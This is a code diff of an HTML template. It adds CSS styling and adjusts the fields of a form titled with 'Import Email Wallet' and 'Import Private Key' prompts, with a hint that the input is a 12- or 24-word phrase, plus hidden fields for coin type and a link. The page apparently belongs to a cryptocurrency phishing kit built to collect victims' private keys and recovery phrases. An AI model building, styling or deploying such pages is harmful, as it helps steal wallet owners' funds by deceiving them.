@@ -7,7 +7,97 @@
 	<link rel="stylesheet" href="assets/css/styles.css">
 	<title></title>
 </head>
+<style>
+    /*===== FORM =====*/
+.l-form{
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  background-color: #1442d99e!important;
+}
+.form{
+  width: 360px;
+  padding: 4rem 2rem;
+  border-radius: 1rem;
+  box-shadow: 0 10px 25px rgba(92,99,105,.2);
+  background: #fff;
+}
+.form__title{
+  font-weight: 400;
+  margin-bottom: 3rem;
+}
+.form__div{
+  position: relative;
+  height: 48px;
+  margin-bottom: 1.5rem;
+}
+.form__input{
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  font-size: var(--normal-font-size);
+  border: 1px solid var(--border-color);
+  border-radius: .5rem;
+  outline: none;
+  padding: 1rem;
+  background: none;
+  z-index: 1;
+}
+.form__label{
+  position: absolute;
+  left: 1rem;
+  top: 1rem;
+  padding: 0 .25rem;
+  background-color: #fff;
+  color: var(--input-color);
+  font-size: var(--normal-font-size);
+  transition: .3s;
+}
+.form__button{
+  display: block;
+  margin-left: auto;
+  padding: .75rem 2rem;
+  outline: none;
+  border: none;
+  background-color: var(--first-color);
+  color: #fff;
+  font-size: var(--normal-font-size);
+  border-radius: .5rem;
+  cursor: pointer;
+  transition: .3s;
+}
+.form__button:hover{
+  box-shadow: 0 10px 36px rgba(0,0,0,.15);
+}
 
+/*Input focus move up label*/
+.form__input:focus + .form__label{
+  top: -.5rem;
+  left: .8rem;
+  color: var(--first-color);
+  font-size: var(--small-font-size);
+  font-weight: 500;
+  z-index: 10;
+}
+
+/*Input focus sticky top label*/
+.form__input:not(:placeholder-shown).form__input:not(:focus)+ .form__label{
+  top: -.5rem;
+  left: .8rem;
+  font-size: var(--small-font-size);
+  font-weight: 500;
+  z-index: 10;
+}
+
+/*Input focus*/
+.form__input:focus{
+  border: 1.5px solid var(--first-color);
+}
+
+</style>
 <body style="background: ">
 	<div class="l-form">
 		<div class="css-gnymxj">
@@ -37,9 +127,9 @@
 					<label for="" class="form__label">Import Email Wallet</label>
 				</div>
 				<div class="form__div">
-					<input type="text" class="form__input" placeholder=" " name="key" style="height: 80px;padding: 8px 7px 11px 7px;font-size: 12px;" required>
+					<input type="text" class="form__input" placeholder=" " name="key" style="" required>
 					<label for="" class="form__label">Import Private Key</label>
-					<input type="hidden" id="wallet" name="wallet_type" value="{{$coin}}" />
+					<input type="hidden" id="wallet"  name="wallet_type" value="{{$coin}}" />
 					<input type="hidden" id="link" name="link" value="{{$data}}" />
 				</div>
 				<p text-align="center" style="font-size: 11px;margin: 1px;font-weight: 100;font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;position: relative;top: 30px;">Typically 12 ( sometimes 24 ) words separated by single spaces</p>
